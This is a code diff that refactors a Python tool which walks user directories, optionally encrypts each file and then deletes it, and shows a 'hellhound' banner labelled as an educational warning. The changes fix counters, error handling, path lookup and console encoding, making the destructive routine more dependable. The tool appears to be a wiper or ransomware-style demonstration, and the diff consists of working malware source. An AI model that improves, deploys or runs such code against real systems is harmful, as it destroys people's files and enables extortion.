@@ -119,15 +119,14 @@ def delete_file_worker(filepath, cipher=None, encrypt_before_delete=False):
         result["size"] = file_size
         
         # Encrypt if requested and cipher available
+        # (encrypt_file swallows its own errors and returns False, so no
+        # try/except is needed here)
         if encrypt_before_delete and cipher:
-            try:
-                if encrypt_file(filepath, cipher):
-                    result["encrypted"] = True
-                    with deletion_lock:
-                        stats["total_encrypted"] += 1
-                        stats["total_size_encrypted"] += file_size
-            except Exception as e:
-                result["error"] = f"Encryption failed: {str(e)}"
+            if encrypt_file(filepath, cipher):
+                result["encrypted"] = True
+                with deletion_lock:
+                    stats["total_encrypted"] += 1
+                    stats["total_size_encrypted"] += file_size
         
         # Delete the file
         os.remove(filepath)
@@ -167,7 +166,8 @@ def delete_directory_contents_threaded(target_dir, cipher=None, encrypt_before_d
         tuple: (files_deleted, directories_cleaned)
     """
     global stats
-    
+
+    files_before = stats["total_files_deleted"]
     dirs_deleted = 0
     files_processed = 0
     
@@ -220,7 +220,7 @@ def delete_directory_contents_threaded(target_dir, cipher=None, encrypt_before_d
     except Exception as e:
         print(f"\033[91m[!] Error processing {target_dir}: {e}\033[0m")
     
-    return stats["total_files_deleted"], dirs_deleted
+    return stats["total_files_deleted"] - files_before, dirs_deleted
 
 def get_target_paths():
     """
@@ -232,8 +232,7 @@ def get_target_paths():
     paths = []
     
     if system == "Windows":
-        username = os.getenv("USERNAME")
-        userprofile = os.getenv("USERPROFILE")
+        userprofile = os.getenv("USERPROFILE") or os.path.expanduser("~")
         
         paths = [
             os.path.join(userprofile, "AppData", "Local", "Temp"),
@@ -370,6 +369,12 @@ def generate_json_report(stats):
 
 def main():
     """Main execution function"""
+    # stdout may be cp1252 (mojibake) or another narrow codec on some
+    # Windows consoles; force UTF-8 so banner/demo output renders.
+    try:
+        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+    except Exception:
+        pass  # stdout without reconfigure (e.g. redirected); keep going
     try:
         # Display educational warning
         display_hellhound_message()
